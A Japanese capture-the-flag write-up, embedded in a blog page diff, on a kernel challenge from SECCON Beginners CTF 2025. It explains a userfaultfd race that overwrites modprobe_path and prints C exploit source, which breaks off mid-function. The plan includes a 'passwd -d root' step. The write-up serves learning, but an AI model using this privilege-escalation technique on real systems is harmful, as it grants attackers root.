@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>Figaro&#x27;s Blog</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    <meta name="robots" content="noodp"/>
+    <meta name="google-site-verification" content="g4e1f-rfOGwL8eft4txNmLdl2trU4nFIKvIdVoXx6V8" />
+
+    <link rel="stylesheet" href="https://figaro-san.github.io/style.css">
+    <link rel="stylesheet" href="https://figaro-san.github.io/color/green.css">
+
+        <link rel="stylesheet" href="https://figaro-san.github.io/color/background_dark.css">
+    
+    <link rel="stylesheet" href="https://figaro-san.github.io/font-hack-subset.css">
+
+    <meta name="description" content="">
+
+    <meta property="og:description" content="">
+    <meta property="og:title" content="Figaro's Blog">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://figaro-san.github.io/timeofcontrol/">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:description" content="">
+    <meta name="twitter:title" content="Figaro's Blog">
+    <meta property="twitter:domain" content="figaro-san.github.io">
+    <meta property="twitter:url" content="https://figaro-san.github.io/timeofcontrol/">
+
+        <link rel="shortcut icon" type="image&#x2F;x-icon" href="/butterfly.jpg">
+    
+    </head>
+
+<body class="">
+<div class="container">
+    
+    <header class="header">
+        <div class="header__inner">
+            <div class="header__logo">
+                    
+                <a href="https://figaro-san.github.io" style="text-decoration: none;">
+                    <div class="logo">
+                      
+                            Figaro&#x27;s Blog
+                        
+                    </div>
+                </a>
+            </div>
+        </div>
+
+        
+        
+                <nav class="menu">
+            <ul class="menu__inner">
+                <li class="active"><a href="https://figaro-san.github.io">blog</a></li>
+            
+                <li><a href="https://figaro-san.github.io/tags">tags</a></li>
+            
+                <li><a href="https://figaro-san.github.io/whoami">whoami</a></li>
+            
+                <li><a href="https://figaro-san.github.io/about">about</a></li>
+            
+                <li><a href="https://figaro-san.github.io/links">links</a></li>
+            </ul>
+        </nav>
+    
+    
+        
+    </header>
+    
+
+    <div class="content">
+        
+    <div class="post">
+        
+    <h1 class="post-title"><a href="https://figaro-san.github.io/timeofcontrol/">TimeOfControl Upsolve</a></h1>
+    <div class="post-meta-inline">
+        
+    <span class="post-date">
+            2026-05-03
+        </span>
+
+    </div>
+
+    
+        <span class="post-tags-inline">
+                :: tags:&nbsp;
+                <a class="post-tag" href="https://figaro-san.github.io/tags/ctf/">#CTF</a></span>
+    
+
+        <div class="post-content">
+            <h2 id="korehahe">これは何</h2>
+<p>昔SECCON Beginners CTF 2025のTimeOfControl以外のwriteup/upsolveを出したのですが、今回はそれの続きです。最近Kernel Exploitに入門する機会が合ったため、復習のためにも解いてみました。</p>
+<h2 id="timeofcontrol">TimeOfControl</h2>
+<p><code>run.sh</code>よりKASLR及びPTIがオフであると分かる。
+とりあえずデバッグしたいので、<code>etc/init.d/S99ctf</code>に変更を加えた(これは後で戻す)</p>
+<ul>
+<li><code>dmesg_restrict</code>を0に変更</li>
+<li><code>kptr_restrict</code>を0に変更</li>
+<li>rootでログインに変更</li>
+</ul>
+<h3 id="gong-ji-nofang-zhen">攻撃の方針</h3>
+<ol>
+<li>race-conditionを利用して<code>is_offset_valid</code>のチェックが通った後に、<code>msg_offset</code>を改ざんする。</li>
+<li><code>msg_offset</code>を不正な値にすることでAAWを獲得し、<code>modprobe_path</code>などを上書きして権限昇格。</li>
+<li>OSはシングルコアで動作していることがわかるため、別スレッドではなく<code>userfaultfd</code>を利用。</li>
+</ol>
+<h3 id="modprobe-pathwotan-su">modprobe_pathを探す</h3>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="python"><span class="giallo-l"><span style="color: #51597D;font-style: italic;">#!/usr/bin/env python3</span></span>
+<span class="giallo-l"><span style="color: #7DCFFF;">from</span><span> pwn</span><span style="color: #7DCFFF;"> import</span><span style="color: #89DDFF;"> *</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>kernel</span><span style="color: #89DDFF;"> =</span><span style="color: #7AA2F7;"> ELF</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">../src/vmlinux</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>test</span><span style="color: #89DDFF;"> =</span><span style="color: #0DB9D7;"> hex</span><span style="color: #9ABDF5;">(</span><span style="color: #0DB9D7;">next</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">kernel</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">search</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">/sbin/modprobe</span><span style="color: #89DDFF;">\x00&quot;</span><span style="color: #9ABDF5;">)))</span></span>
+<span class="giallo-l"><span style="color: #0DB9D7;">print</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">f</span><span style="color: #9ECE6A;">&quot;address of modprobe_path: </span><span style="color: #BB9AF7;">{</span><span style="color: #C0CAF5;">test</span><span style="color: #BB9AF7;">}</span><span style="color: #9ECE6A;">&quot;</span><span style="color: #9ABDF5;">)</span></span></code></pre><pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="plain"><span class="giallo-l"><span>address of modprobe_path: 0xffffffff820ade80</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>gef&gt; x/s 0xffffffff820ade80</span></span>
+<span class="giallo-l"><span>0xffffffff820ade80:	&quot;/sbin/modprobe&quot;</span></span></code></pre><h3 id="global-msgwotan-su">global_msgを探す</h3>
+<p>モジュールの大域変数はどこにあるのか。<code>vmmap</code>で見ると下の方に<code>modules</code>の<code>rw</code>な領域がある。</p>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="plain"><span class="giallo-l"><span>0xffffffff81000000-0xffffffff81c00000 0x0000000000c00000 [r-x] kernel .text</span></span>
+<span class="giallo-l"><span>0xffffffff81c00000-0xffffffff81e00000 0x0000000000200000 [r--] maybe kernel .rodata</span></span>
+<span class="giallo-l"><span>0xffffffff81e00000-0xffffffff81eb5000 0x00000000000b5000 [r--]</span></span>
+<span class="giallo-l"><span>0xffffffff81eb5000-0xffffffff82000000 0x000000000014b000 [rw-] maybe kernel .data</span></span>
+<span class="giallo-l"><span>0xffffffff82000000-0xffffffff82004000 0x0000000000004000 [rw-] kstack PID:0 (swapper/0)</span></span>
+<span class="giallo-l"><span>0xffffffff82004000-0xffffffff822d0000 0x00000000002cc000 [rw-]</span></span>
+<span class="giallo-l"><span>0xffffffff822d0000-0xffffffff822d1000 0x0000000000001000 [r--]</span></span>
+<span class="giallo-l"><span>0xffffffff822d1000-0xffffffff82600000 0x000000000032f000 [rw-]</span></span>
+<span class="giallo-l"><span>0xffffffffc0000000-0xffffffffc0001000 0x0000000000001000 [r-x] modules, kernel module (ctf4b)</span></span>
+<span class="giallo-l"><span>0xffffffffc0002000-0xffffffffc0004000 0x0000000000002000 [rw-] modules</span></span>
+<span class="giallo-l"><span>0xffffffffc0005000-0xffffffffc0006000 0x0000000000001000 [r--] modules</span></span>
+<span class="giallo-l"><span>0xffffffffff5fc000-0xffffffffff5fe000 0x0000000000002000 [rw-] fixmap</span></span></code></pre>
+<p>ここを<code>tel</code>してみると下の方に文字列があった。つまり<code>0xffffffffc0002160</code>が<code>global_msg</code>のアドレスであるとわかる。</p>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="plain"><span class="giallo-l"><span>0xffffffffc0002160|+0x0160|+044: 0x50206c656e72654b &#39;Kernel Pwn is fun!&#39;</span></span>
+<span class="giallo-l"><span>0xffffffffc0002168|+0x0168|+045: 0x7566207369206e77 &#39;wn is fun!&#39;</span></span>
+<span class="giallo-l"><span>0xffffffffc0002170|+0x0170|+046: 0x000000000000216e (&#39;n!&#39;?)</span></span></code></pre>
+<p>おそらくGhidraとかで文字列を探せばよかった気もする。(KASLRオフだし)</p>
+<h3 id="exploitnofang-zhen">Exploitの方針</h3>
+<p>情報が揃ったためExploitを作成する。流れは以下になる。</p>
+<ol>
+<li><code>mmap</code>で<code>0x1000</code>の領域を確保し、userfaultfdに登録する</li>
+<li>その領域を<code>ioctl(fd, CTF4b_IOCTL_WRITE, page)</code>でモジュールに渡し、アクセスを誘発してページフォルトを発生させる</li>
+<li>PF後、ハンドラでは以下2つを行う
+<ol>
+<li><code>ioctl(fd, CTF4b_IOCTL_SEEK, offset)</code>で<code>global_msg</code>から<code>modprobe_path</code>へのoffsetを設定する</li>
+<li><code>struct ctf4b_request</code>の<code>buf</code>に<code>modprobe_path</code>に書き込みたいファイルパスを書き込み、ページの先頭に書き込んで返す</li>
+</ol>
+</li>
+<li><code>modprobe_path</code>が書き換わったので、これを悪用する
+<ol>
+<li><code>/tmp/exploit, /tmp/invalid_magic</code>を作成</li>
+<li>前者には<code>passwd -d root</code>でrootのパスワードを削除しておく。これによって権限昇格時にパスワードを不要にする。</li>
+<li>後者には意味のないマジックナンバーを書き込む</li>
+<li>最後に後者を実行し、追加で<code>su root</code>も実行しておく。</li>
+</ol>
+</li>
+</ol>
+<h3 id="zhu-yi-dian">注意点</h3>
+<p>ページフォルトを起こすマッピング領域を<code>ioctl(fd, CTF4b_IOCTL_WRITE, page)</code>で渡していることに注意したい。実は私は最初、<code>page</code>ではなく<code>page</code>を<code>struct ctf4b_resquest</code>にラップして渡していたため、ハンドラでは<code>ctf4b_request</code>のメンバである<code>buf</code>をページに書き込んで返す必要があったのだが、ハンドラでも構造体を返していたため動かなかった。これで1時間はハマった。</p>
+<h3 id="exploit">Exploit</h3>
+<p>Exploitの全体は以下。</p>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="c"><span class="giallo-l"><span style="color: #89DDFF;">#</span><span style="color: #BB9AF7;">define</span><span style="color: #7AA2F7;"> _GNU_SOURCE</span></span>
+<span class="giallo-l"><span style="color: #89DDFF;">#</span><span style="color: #BB9AF7;">include</span><span style="color: #89DDFF;"> &lt;</span><span style="color: #9ECE6A;">assert.h</span><span style="color: #89DDFF;">&gt;</span></span>
+<span class="giallo-l"><span style="color: #89DDFF;">#</span><span style="color: #BB9AF7;">include</span><span style="color: #89DDFF;"> &lt;</span><span style="color: #9ECE6A;">fcntl.h</span><span style="color: #89DDFF;">&gt;</span></span>
+<span class="giallo-l"><span style="color: #89DDFF;">#</span><span style="color: #BB9AF7;">include</span><span style="color: #89DDFF;"> &lt;</span><span style="color: #9ECE6A;">linux/userfaultfd.h</span><span style="color: #89DDFF;">&gt;</span></span>
+<span class="giallo-l"><span style="color: #89DDFF;">#</span><span style="color: #BB9AF7;">include</span><span style="color: #89DDFF;"> &lt;</span><span style="color: #9ECE6A;">poll.h</span><span style="color: #89DDFF;">&gt;</span></span>
+<span class="giallo-l"><span style="color: #89DDFF;">#</span><span style="color: #BB9AF7;">include</span><span style="color: #89DDFF;"> &lt;</span><span style="color: #9ECE6A;">pthread.h</span><span style="color: #89DDFF;">&gt;</span></span>
+<span class="giallo-l"><span style="color: #89DDFF;">#</span><span style="color: #BB9AF7;">include</span><span style="color: #89DDFF;"> &lt;</span><span style="color: #9ECE6A;">stdbool.h</span><span style="color: #89DDFF;">&gt;</span></span>
+<span class="giallo-l"><span style="color: #89DDFF;">#</span><span style="color: #BB9AF7;">include</span><span style="color: #89DDFF;"> &lt;</span><span style="color: #9ECE6A;">stdint.h</span><span style="color: #89DDFF;">&gt;</span></span>
+<span class="giallo-l"><span style="color: #89DDFF;">#</span><span style="color: #BB9AF7;">include</span><span style="color: #89DDFF;"> &lt;</span><span style="color: #9ECE6A;">stdio.h</span><span style="color: #89DDFF;">&gt;</span></span>
+<span class="giallo-l"><span style="color: #89DDFF;">#</span><span style="color: #BB9AF7;">include</span><span style="color: #89DDFF;"> &lt;</span><span style="color: #9ECE6A;">stdlib.h</span><span style="color: #89DDFF;">&gt;</span></span>
+<span class="giallo-l"><span style="color: #89DDFF;">#</span><span style="color: #BB9AF7;">include</span><span style="color: #89DDFF;"> &lt;</span><span style="color: #9ECE6A;">string.h</span><span style="color: #89DDFF;">&gt;</span></span>
+<span class="giallo-l"><span style="color: #89DDFF;">#</span><span style="color: #BB9AF7;">include</span><span style="color: #89DDFF;"> &lt;</span><span style="color: #9ECE6A;">sys/ioctl.h</span><span style="color: #89DDFF;">&gt;</span></span>
+<span class="giallo-l"><span style="color: #89DDFF;">#</span><span style="color: #BB9AF7;">include</span><span style="color: #89DDFF;"> &lt;</span><span style="color: #9ECE6A;">sys/mman.h</span><span style="color: #89DDFF;">&gt;</span></span>
+<span class="giallo-l"><span style="color: #89DDFF;">#</span><span style="color: #BB9AF7;">include</span><span style="color: #89DDFF;"> &lt;</span><span style="color: #9ECE6A;">sys/syscall.h</span><span style="color: #89DDFF;">&gt;</span></span>
+<span class="giallo-l"><span style="color: #89DDFF;">#</span><span style="color: #BB9AF7;">include</span><span style="color: #89DDFF;"> &lt;</span><span style="color: #9ECE6A;">unistd.h</span><span style="color: #89DDFF;">&gt;</span></span>
+<span class="giallo-l"><span style="color: #89DDFF;">#</span><span style="color: #BB9AF7;">include</span><span style="color: #89DDFF;"> &lt;</span><span style="color: #9ECE6A;">sys/stat.h</span><span style="color: #89DDFF;">&gt;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #89DDFF;">#</span><span style="color: #BB9AF7;">include</span><span style="color: #89DDFF;"> &quot;</span><span style="color: #9ECE6A;">../src/ctf4b.h</span><span style="color: #89DDFF;">&quot;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #89DDFF;">#</span><span style="color: #BB9AF7;">define</span><span style="color: #7AA2F7;"> PAGE_SIZE</span><span style="color: #F7768E;"> 0x</span><span style="color: #FF9E64;">1000</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">int</span><span> fd </span><span style="color: #89DDFF;">=</span><span style="color: #FF9E64;"> 0</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #9D7CD8;font-style: italic;">static</span><span style="color: #BB9AF7;"> void</span><span style="color: #89DDFF;"> *</span><span style="color: #7AA2F7;">userfaultfd_handler</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">void</span><span style="color: #89DDFF;"> *</span><span style="color: #E0AF68;">arg</span><span style="color: #9ABDF5;">) {</span></span>
+<span class="giallo-l"><span style="color: #9D7CD8;font-style: italic;">  static</span><span style="color: #BB9AF7;"> struct</span><span style="color: #9ABDF5;"> uffd_msg msg</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">  struct</span><span style="color: #9ABDF5;"> uffdio_copy copy</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">  long</span><span style="color: #9ABDF5;"> uffd </span><span style="color: #89DDFF;">=</span><span style="color: #9ABDF5;"> (</span><span style="color: #BB9AF7;">long</span><span style="color: #9ABDF5;">)arg</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">  void</span><span style="color: #89DDFF;"> *</span><span style="color: #9ABDF5;">dummy_page </span><span style="color: #89DDFF;">=</span><span style="color: #7AA2F7;"> mmap</span><span style="color: #9ABDF5;">(</span><span style="color: #FF9E64;">NULL</span><span style="color: #89DDFF;">,</span><span style="color: #7AA2F7;"> PAGE_SIZE</span><span style="color: #89DDFF;">,</span><span style="color: #7AA2F7;"> PROT_READ </span><span style="color: #89DDFF;">|</span><span style="color: #7AA2F7;"> PROT_WRITE</span><span style="color: #89DDFF;">,</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">                          MAP_PRIVATE </span><span style="color: #89DDFF;">|</span><span style="color: #7AA2F7;"> MAP_ANONYMOUS</span><span style="color: #89DDFF;">, -</span><span style="color: #FF9E64;">1</span><span style="color: #89DDFF;">,</span><span style="color: #FF9E64;"> 0</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  assert</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">dummy_page </span><span style="color: #BB9AF7;">!=</span><span style="color: #7AA2F7;"> MAP_FAILED</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">  struct</span><span style="color: #9ABDF5;"> pollfd pollfd </span><span style="color: #89DDFF;">=</span><span style="color: #9ABDF5;"> {</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">      .fd </span><span style="color: #89DDFF;">=</span><span style="color: #9ABDF5;"> uffd</span><span style="color: #89DDFF;">,</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">      .events </span><span style="color: #89DDFF;">=</span><span style="color: #9ABDF5;"> POLLIN</span><span style="color: #89DDFF;">,</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">  }</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  printf</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;\t</span><span style="color: #9ECE6A;">[handler] waiting for page fault...</span><span style="color: #89DDFF;">\n&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">  while</span><span style="color: #9ABDF5;"> (</span><span style="color: #7AA2F7;">poll</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&amp;</span><span style="color: #7AA2F7;">pollfd</span><span style="color: #89DDFF;">,</span><span style="color: #FF9E64;"> 1</span><span style="color: #89DDFF;">, -</span><span style="color: #FF9E64;">1</span><span style="color: #9ABDF5;">)</span><span style="color: #BB9AF7;"> &gt;</span><span style="color: #FF9E64;"> 0</span><span style="color: #9ABDF5;">) {</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    assert</span><span style="color: #9ABDF5;">((</span><span style="color: #C0CAF5;">pollfd</span><span style="color: #89DDFF;">.</span><span style="color: #C0CAF5;">revents</span><span style="color: #89DDFF;"> &amp;</span><span style="color: #7AA2F7;"> POLLERR </span><span style="color: #BB9AF7;">||</span><span style="color: #C0CAF5;"> pollfd</span><span style="color: #89DDFF;">.</span><span style="color: #C0CAF5;">revents</span><span style="color: #89DDFF;"> &amp;</span><span style="color: #7AA2F7;"> POLLHUP</span><span style="color: #9ABDF5;">)</span><span style="color: #BB9AF7;"> ==</span><span style="color: #FF9E64;"> false</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    assert</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">read</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">uffd</span><span style="color: #89DDFF;">, &amp;</span><span style="color: #7AA2F7;">msg</span><span style="color: #89DDFF;">, sizeof</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">msg</span><span style="color: #9ABDF5;">))</span><span style="color: #BB9AF7;"> &gt;</span><span style="color: #FF9E64;"> 0</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    assert</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">msg</span><span style="color: #89DDFF;">.</span><span style="color: #C0CAF5;">event</span><span style="color: #BB9AF7;"> ==</span><span style="color: #7AA2F7;"> UFFD_EVENT_PAGEFAULT</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    printf</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;\t</span><span style="color: #9ECE6A;">[handler] pagefault occured</span><span style="color: #89DDFF;">\n&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">    /*</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">     * この時点で is_offset_validを通過後である</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">     * よってmsg_offsetをCTF4b_IOCTL_SEEKで、modprobe_pathまでのoffsetに変更する</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">     * offset = addr_modprobe_path - addr_global_msg</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">     */</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    ioctl</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">fd</span><span style="color: #89DDFF;">,</span><span style="color: #7AA2F7;"> CTF4b_IOCTL_SEEK</span><span style="color: #89DDFF;">,</span><span style="color: #F7768E;"> 0x</span><span style="color: #FF9E64;">ffffffff820ade80</span><span style="color: #89DDFF;"> -</span><span style="color: #F7768E;"> 0x</span><span style="color: #FF9E64;">ffffffffc0002160</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">    /*</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">     * 加えて、ここでmodprobe_pathに書き込みたい内容を準備する</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">     */</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">    char</span><span style="color: #89DDFF;"> *</span><span style="color: #9ABDF5;">path </span><span style="color: #89DDFF;">= &quot;</span><span style="color: #9ECE6A;">/tmp/exploit</span><span style="color: #89DDFF;">\x00&quot;;</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">    struct</span><span style="color: #9ABDF5;"> ctf4b_request req </span><span style="color: #89DDFF;">=</span><span style="color: #9ABDF5;"> {</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">        .buf </span><span style="color: #89DDFF;">=</span><span style="color: #9ABDF5;"> path</span><span style="color: #89DDFF;">,</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">        .size </span><span style="color: #89DDFF;">=</span><span style="color: #7AA2F7;"> strlen</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">path</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;"> +</span><span style="color: #FF9E64;"> 1</span><span style="color: #89DDFF;">,</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">    }</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    memcpy</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">dummy_page</span><span style="color: #89DDFF;">, &amp;</span><span style="color: #7AA2F7;">req</span><span style="color: #89DDFF;">, sizeof</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">struct</span><span style="color: #7AA2F7;"> ctf4b_request</span><span style="color: #9ABDF5;">))</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #C0CAF5;">    copy</span><span style="color: #89DDFF;">.</span><span style="color: #C0CAF5;">src</span><span style="color: #89DDFF;"> =</span><span style="color: #9ABDF5;"> (</span><span style="color: #BB9AF7;">unsigned long</span><span style="color: #9ABDF5;">)dummy_page</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #C0CAF5;">    copy</span><span style="color: #89DDFF;">.</span><span style="color: #C0CAF5;">dst</span><span style="color: #89DDFF;"> =</span><span style="color: #9ABDF5;"> (</span><span style="color: #BB9AF7;">unsigned long</span><span style="color: #9ABDF5;">)</span><span style="color: #C0CAF5;">msg</span><span style="color: #89DDFF;">.</span><span style="color: #C0CAF5;">arg</span><span style="color: #89DDFF;">.</span><span style="color: #C0CAF5;">pagefault</span><span style="color: #9ABDF5;">.</span><span style="color: #C0CAF5;">address</span><span style="color: #89DDFF;"> &amp; ~</span><span style="color: #F7768E;">0x</span><span style="color: #FF9E64;">fff</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #C0CAF5;">    copy</span><span style="color: #89DDFF;">.</span><span style="color: #C0CAF5;">len</span><span style="color: #89DDFF;"> =</span><span style="color: #9ABDF5;"> PAGE_SIZE</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #C0CAF5;">    copy</span><span style="color: #89DDFF;">.</span><span style="color: #C0CAF5;">mode</span><span style="color: #89DDFF;"> =</span><span style="color: #FF9E64;"> 0</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #C0CAF5;">    copy</span><span style="color: #89DDFF;">.</span><span style="color: #C0CAF5;">copy</span><span style="color: #89DDFF;"> =</span><span style="color: #FF9E64;"> 0</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    printf</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;\t</span><span style="color: #9ECE6A;">[handler] overwrite modprobe_path</span><span style="color: #89DDFF;">\n&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    assert</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">ioctl</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">uffd</span><span style="color: #89DDFF;">,</span><span style="color: #7AA2F7;"> UFFDIO_COPY</span><span style="color: #89DDFF;">, &amp;</span><span style="color: #7AA2F7;">copy</span><span style="color: #9ABDF5;">)</span><span style="color: #BB9AF7;"> !=</span><span style="color: #89DDFF;"> -</span><span style="color: #FF9E64;">1</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">  }</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">  return</span><span style="color: #FF9E64;"> NULL</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">void</span><span style="color: #7AA2F7;"> register_userfaultfd</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">void</span><span style="color: #89DDFF;"> *</span><span style="color: #E0AF68;">addr</span><span style="color: #89DDFF;">,</span><span style="color: #BB9AF7;"> size_t</span><span style="color: #E0AF68;"> len</span><span style="color: #9ABDF5;">) {</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">  long</span><span style="color: #9ABDF5;"> uffd </span><span style="color: #89DDFF;">=</span><span style="color: #7AA2F7;"> syscall</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">__NR_userfaultfd</span><span style="color: #89DDFF;">,</span><span style="color: #7AA2F7;"> O_CLOEXEC </span><span style="color: #89DDFF;">|</span><span style="color: #7AA2F7;"> O_NONBLOCK</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  assert</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">uffd </span><span style="color: #BB9AF7;">!=</span><span style="color: #89DDFF;"> -</span><span style="color: #FF9E64;">1</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">  struct</span><span style="color: #9ABDF5;"> uffdio_api uffdio_api </span><span style="color: #89DDFF;">=</span><span style="color: #9ABDF5;"> {</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">      .api </span><span style="color: #89DDFF;">=</span><span style="color: #9ABDF5;"> UFFD_API</span><span style="color: #89DDFF;">,</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">      .features </span><span style="color: #89DDFF;">=</span><span style="color: #FF9E64;"> 0</span><span style="color: #89DDFF;">,</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">  }</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  assert</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">ioctl</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">uffd</span><span style="color: #89DDFF;">,</span><span style="color: #7AA2F7;"> UFFDIO_API</span><span style="color: #89DDFF;">, &amp;</span><span style="color: #7AA2F7;">uffdio_api</span><span style="color: #9ABDF5;">)</span><span style="color: #BB9AF7;"> &gt;=</span><span style="color: #FF9E64;"> 0</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">  struct</span><span style="color: #9ABDF5;"> uffdio_register uffdio_register </span><span style="color: #89DDFF;">=</span><span style="color: #9ABDF5;"> {</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">      .</span><span style="color: #C0CAF5;">range</span><span style="color: #89DDFF;">.</span><span style="color: #C0CAF5;">start</span><span style="color: #89DDFF;"> =</span><span style="color: #9ABDF5;"> (</span><span style="color: #BB9AF7;">unsigned long</span><span style="color: #9ABDF5;">)addr</span><span style="color: #89DDFF;">,</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">      .</span><span style="color: #C0CAF5;">range</span><span style="color: #89DDFF;">.</span><span style="color: #C0CAF5;">len</span><span style="color: #89DDFF;"> =</span><span style="color: #9ABDF5;"> len</span><span style="color: #89DDFF;">,</span></span>
